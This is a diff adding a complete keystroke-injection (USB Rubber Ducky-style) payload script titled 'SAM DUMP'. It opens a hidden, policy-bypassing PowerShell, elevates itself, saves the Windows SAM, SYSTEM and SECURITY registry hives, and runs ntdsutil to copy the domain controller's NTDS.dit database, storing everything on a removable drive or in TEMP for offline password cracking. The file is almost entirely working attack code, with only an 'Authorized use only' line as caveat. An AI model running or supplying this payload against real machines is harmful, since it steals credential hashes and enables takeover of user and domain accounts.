@@ -1,0 +1,14 @@
+REM ============================================================================
+REM  SAM DUMP — Extract Windows Password Hashes (Requires Admin)
+REM  ============================================================================
+REM  Dumps SAM, SYSTEM, and SECURITY registry hives for offline cracking.
+REM  Also grabs NTDS.dit pointer if domain controller.
+REM  
+REM  FLLC | Authorized use only.
+REM ============================================================================
+
+DELAY 1500
+GUI r
+DELAY 600
+STRING powershell -W Hidden -NoP -Exec Bypass -C "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoP -W Hidden -Exec Bypass -C \"$d=(Get-WmiObject Win32_LogicalDisk -F \\\"DriveType=2\\\"|%{`$_.DeviceID}|Select -First 1);if(!$d){$d=$env:TEMP};$o=\\\"$d\\sam_dump\\\";md $o -F|Out-Null;reg save HKLM\\SAM $o\\SAM 2>$null;reg save HKLM\\SYSTEM $o\\SYSTEM 2>$null;reg save HKLM\\SECURITY $o\\SECURITY 2>$null;ntdsutil \\\"ac i ntds\\\" \\\"ifm\\\" \\\"create full $o\\ntds\\\" q q 2>$null;\\\"DONE\\\"|Out-File $o\\complete.txt\"'"
+ENTER
